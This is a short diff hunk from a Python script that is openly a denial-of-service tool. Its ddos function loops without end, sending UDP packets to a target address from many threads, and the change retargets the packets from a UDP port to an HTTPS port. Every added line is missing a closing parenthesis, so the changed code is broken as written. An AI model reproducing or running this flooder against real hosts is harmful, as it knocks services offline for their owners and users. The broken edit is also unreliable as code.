@@ -32,15 +32,15 @@ time.sleep(3)
 def ddos(i):
     while 1:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
+        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, HTTPS_PORT)
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
+        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, HTTPS_PORT)
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
+        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, HTTPS_PORT)
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
+        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, HTTPS_PORT)
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
+        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, HTTPS_PORT)
         print("           •HAMLE SHOD•")
        
 for i in range(int(thread_count)):
